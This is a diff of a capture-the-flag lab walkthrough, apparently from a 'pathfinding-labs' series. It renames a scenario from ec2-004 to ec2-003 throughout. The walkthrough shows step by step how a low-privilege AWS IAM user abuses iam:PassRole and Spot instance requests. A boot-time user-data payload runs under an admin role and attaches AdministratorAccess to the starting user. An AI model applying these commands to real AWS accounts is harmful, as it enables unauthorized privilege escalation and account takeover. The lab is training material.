@@ -8,7 +8,7 @@ This attack pattern also avoids the need to log into or directly interact with t
 
 ## The Challenge
 
-You have obtained credentials for `pl-prod-ec2-004-to-admin-starting-user` -- a low-privilege IAM user with two specific permissions: `iam:PassRole` (scoped to the target admin role) and `ec2:RequestSpotInstances`. Your goal is to escalate to effective administrator access in this AWS account.
+You have obtained credentials for `pl-prod-ec2-003-to-admin-starting-user` -- a low-privilege IAM user with two specific permissions: `iam:PassRole` (scoped to the target admin role) and `ec2:RequestSpotInstances`. Your goal is to escalate to effective administrator access in this AWS account.
 
 Start by confirming your identity and verifying that you genuinely don't have admin access yet:
 
@@ -20,7 +20,7 @@ unset AWS_SESSION_TOKEN
 aws sts get-caller-identity
 ```
 
-You should see yourself operating as `pl-prod-ec2-004-to-admin-starting-user`. Confirm that admin-level calls are blocked:
+You should see yourself operating as `pl-prod-ec2-003-to-admin-starting-user`. Confirm that admin-level calls are blocked:
 
 ```bash
 aws iam list-users --max-items 1
@@ -37,19 +37,19 @@ First, look for roles in this account that could be passed to an EC2 instance:
 
 ```bash
 aws iam list-roles \
-  --query 'Roles[?contains(RoleName, `ec2-004`)].{Name:RoleName,Arn:Arn}' \
+  --query 'Roles[?contains(RoleName, `ec2-003`)].{Name:RoleName,Arn:Arn}' \
   --output table
 ```
 
-You'll find `pl-prod-ec2-004-to-admin-target-role`. Now check if there is an instance profile wrapping it -- instance profiles are the bridge between IAM roles and EC2 instances:
+You'll find `pl-prod-ec2-003-to-admin-target-role`. Now check if there is an instance profile wrapping it -- instance profiles are the bridge between IAM roles and EC2 instances:
 
 ```bash
 aws iam list-instance-profiles \
-  --query 'InstanceProfiles[?contains(InstanceProfileName, `ec2-004`)].{Name:InstanceProfileName,Arn:Arn}' \
+  --query 'InstanceProfiles[?contains(InstanceProfileName, `ec2-003`)].{Name:InstanceProfileName,Arn:Arn}' \
   --output table
 ```
 
-There it is: `pl-prod-ec2-004-to-admin-instance-profile`. This instance profile wraps the admin role and is what you'll reference when launching the Spot Instance.
+There it is: `pl-prod-ec2-003-to-admin-instance-profile`. This instance profile wraps the admin role and is what you'll reference when launching the Spot Instance.
 
 Before you can launch the instance, you need two more pieces of infrastructure information: an AMI ID and a subnet. Pull the latest Amazon Linux 2023 AMI and a subnet from the `pathfinding` VPC:
 
@@ -95,7 +95,7 @@ Now you have everything you need. The attack has two logical steps: craft a mali
 The user-data script is the payload. It runs automatically when the instance boots, under the credentials of the instance profile role -- the admin role. One AWS CLI call is all it needs:
 
 ```bash
-STARTING_USER="pl-prod-ec2-004-to-admin-starting-user"
+STARTING_USER="pl-prod-ec2-003-to-admin-starting-user"
 
 USER_DATA=$(cat <<EOF
 #!/bin/bash
@@ -120,7 +120,7 @@ USER_DATA_B64=$(echo "$USER_DATA" | base64 | tr -d '\n')
 The 15-second sleep gives the instance time to fully initialize and the instance profile credentials to become available via IMDS. Now construct the launch specification and submit the Spot request:
 
 ```bash
-INSTANCE_PROFILE="pl-prod-ec2-004-to-admin-instance-profile"
+INSTANCE_PROFILE="pl-prod-ec2-003-to-admin-instance-profile"
 
 LAUNCH_SPEC=$(cat <<EOF
 {
@@ -162,7 +162,7 @@ Once the state is `active` and the code is `fulfilled`, you have an instance ID.
 
 ```bash
 aws iam list-attached-user-policies \
-  --user-name pl-prod-ec2-004-to-admin-starting-user \
+  --user-name pl-prod-ec2-003-to-admin-starting-user \
   --query 'AttachedPolicies[?PolicyName==`AdministratorAccess`].PolicyName' \
   --output text
 ```
@@ -187,7 +187,7 @@ Using your starting user credentials (which, thanks to the previous step, now ho
 
 ```bash
 aws ssm get-parameter \
-    --name /pathfinding-labs/flags/ec2-004-to-admin \
+    --name /pathfinding-labs/flags/ec2-003-to-admin \
     --query 'Parameter.Value' \
     --output text
 # flag{...}  — your scenario-specific flag value
